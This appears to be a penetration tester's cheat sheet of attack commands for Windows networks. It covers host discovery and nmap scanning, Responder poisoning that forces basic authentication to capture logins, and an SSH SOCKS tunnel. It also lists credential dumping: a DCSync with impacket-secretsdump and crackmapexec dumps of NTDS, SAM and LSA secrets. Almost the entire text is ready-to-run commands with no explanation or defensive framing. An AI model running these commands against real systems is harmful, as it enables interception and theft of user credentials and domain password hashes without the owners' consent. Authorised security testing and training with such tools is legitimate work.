# Network Information

## Passive

arp -a

ifconfig / ipconfig

tcpdump -i eth0

netdiscover

## Scanning

nbtscan 192.168.1.1/24

nbtscan-unixwiz 192.168.1.1/24

nmap -sSV --open -iL ips.txt -oA output

sudo nmap --script broadcast-dhcp-discover

ping 255.255.255.255

## Responder

### Analyze Mode
responder -I eth0 -A

responder -I eth0 -wFP

### Force Basic Auth
responder -I eth0 -wbFP


# SSH Tunneling

### Socks proxy
ssh -D 8080 root@IP

Set Firefox network settings to use socks5 proxy 127.0.0.1 8080, must remove the HTTP proxy

# Dumping

## DCSYNC

impacket-secretsdump DOMAIN/user:password@IP -history -outputfile output

crackmapexec smb IP -u user -p password --ntds

## Other

crackmapexec smb IP -u user -p password --sam

crackmapexec smb IP -u user -p password --lsa
